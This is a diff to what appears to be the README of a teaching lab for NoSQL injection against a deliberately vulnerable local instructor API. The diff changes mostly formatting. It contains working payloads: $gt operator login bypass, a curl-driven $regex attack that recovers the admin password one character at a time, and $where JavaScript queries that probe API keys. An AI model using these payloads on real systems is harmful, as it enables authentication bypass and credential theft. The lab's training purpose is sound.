@@ -26,21 +26,23 @@ The target endpoints live under `http://localhost:4000/api/instructors`.
    ```
    npm run dev
    ```
+
    API → `http://localhost:4000`, web app → `http://localhost:5175`.
 
 ### The accounts that exist
 
-| Username     | Role         | Notes                                  |
-|--------------|--------------|----------------------------------------|
-| `prof.smith` | instructor   | CS                                     |
-| `prof.jones` | instructor   | Math                                   |
-| `prof.lee`   | instructor   | Math                                   |
+| Username       | Role                 | Notes                                 |
+| -------------- | -------------------- | ------------------------------------- |
+| `prof.smith` | instructor           | CS                                    |
+| `prof.jones` | instructor           | Math                                  |
+| `prof.lee`   | instructor           | Math                                  |
 | `admin`      | **superadmin** | Holds a secret API key + private info |
 
 You are **not** given the passwords or the API key. Your job is to get in and
 extract them using injection.
 
 > ### Postman quick start
+>
 > - Create a new request. Set the **method** and **URL** as each step says.
 > - For `POST` requests: open the **Body** tab → choose **raw** → set the type
 >   dropdown to **JSON**. Paste the JSON body shown in the step.
@@ -105,6 +107,7 @@ matching account**, no password needed. The response even includes sensitive
 fields (role, private email/phone, and for the admin, the API key).
 
 **Variation** (same idea, "greater than empty string" always true):
+
 ```json
 { "username": { "$gt": "" }, "password": { "$gt": "" } }
 ```
@@ -151,27 +154,31 @@ at a time.
 Start by testing the first character:
 
 - Postman: `POST http://localhost:4000/api/instructors/login`, Body → raw → JSON:
+
   ```json
   { "username": "admin", "password": { "$regex": "^S" } }
   ```
 - curl:
+
   ```bash
   curl -X POST http://localhost:4000/api/instructors/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$regex":"^S"}}'
   ```
-
 - **`200`** (login succeeds) → the password **starts with** `S`. Keep that
   character and extend the prefix.
 - **`401`** → wrong guess; try another character.
 
 Then grow the prefix one char at a time:
+
 ```json
 { "username": "admin", "password": { "$regex": "^Se" } }
 ```
+
 ```json
 { "username": "admin", "password": { "$regex": "^S3" } }
 ```
+
 …and so on until you have recovered the whole password. Anchor the end with `$`
 (e.g. `"^S3cr3t-Admin-Pw!$"`) to confirm you have the complete value.
 
@@ -203,17 +210,21 @@ Find every account whose password is longer than 10 characters:
 the server-evaluated JavaScript returned true.
 
 Try another expression — accounts whose API key starts with `sk_live`:
+
 ```
 ?$where=this.apiKey && this.apiKey.indexOf('sk_live')===0
 ```
 
 > ### ⚠️ `$where` depends on the database
+>
 > `$where` only runs if the database permits server-side JavaScript. A **local
 > `mongod`** allows it by default, so these requests execute there. **MongoDB
 > Atlas shared/free (M0/M2/M5) tiers block it** and reply with:
+>
 > ```json
 > { "message": "$where not allowed in this atlas tier" }
 > ```
+>
 > If you see that message, your injection still reached the query engine (the
 > code passed `$where` through unchanged) — the engine simply refused to run it.
 > To watch it actually execute, point `server/.env`'s `MONGO_URI` at a local
